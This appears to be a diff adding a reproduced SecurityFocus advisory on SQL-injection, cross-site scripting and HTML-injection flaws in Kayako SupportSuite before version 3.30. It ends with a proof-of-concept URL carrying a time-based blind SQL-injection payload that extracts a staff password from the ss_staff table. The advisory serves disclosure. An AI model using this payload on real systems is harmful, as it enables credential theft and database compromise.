@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/30642/info
+  
+Kayako SupportSuite is prone to multiple input-validation vulnerabilities, including an SQL-injection issue, multiple cross-site scripting issues, and an HTML-injection issue. The vulnerabilities occur because the application fails to sufficiently sanitize user-supplied data.
+  
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+  
+Versions prior to Kayako SupportSuite 3.30 are vulnerable. 
+
+http://www.example.com/staff/index.php?_m=tickets&_a=ticketactions&action=delcflink&ticketid=1&customfieldlinkid=-99&#039;UNION SELECT IF(SUBSTRING(password,1, 1) = CHAR(50), BENCHMARK(1000000,MD5(CHAR(1))), null),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROMss_staff WHERE staffid=1/*
